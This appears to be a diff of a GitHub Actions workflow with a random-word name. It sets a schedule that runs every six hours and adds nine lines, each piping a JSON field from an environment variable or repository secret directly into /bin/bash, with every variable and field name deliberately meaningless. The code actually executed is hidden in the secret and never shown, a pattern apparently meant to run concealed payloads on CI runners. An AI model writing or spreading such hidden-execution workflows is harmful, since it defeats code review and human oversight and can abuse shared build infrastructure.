@@ -1,20 +1,25 @@
 name: glisteningpartridges
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 5/6 * * *'
-
+    - cron: '28 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: glisteningpartridges
         env:
-          cblny00913: ${{ secrets.cblny00913 }}
+          adhqz7: ${{ secrets.adhqz7 }}
         run: |
-          echo $cblny00913 | jq -r .yqdg1904 | /bin/bash
-          echo $mypxn9921 | jq -r .t75 | /bin/bash
-          echo $sydis355 | jq -r .ds389 | /bin/bash
+          echo $adhqz7 | jq -r .pmw148 | /bin/bash
+          echo $ee9214 | jq -r .imnlu940 | /bin/bash
+          echo $ngbr066 | jq -r .iog46260 | /bin/bash
+          echo $a35652 | jq -r .mtvdc2 | /bin/bash
+          echo $rbww4 | jq -r .q61107 | /bin/bash
+          echo $fezde5576 | jq -r .hfvep4371 | /bin/bash
+          echo $vzbs469 | jq -r .fop016 | /bin/bash
+          echo $gqlsq8 | jq -r .zc8201 | /bin/bash
+          echo $tz62 | jq -r .nf9 | /bin/bash
 
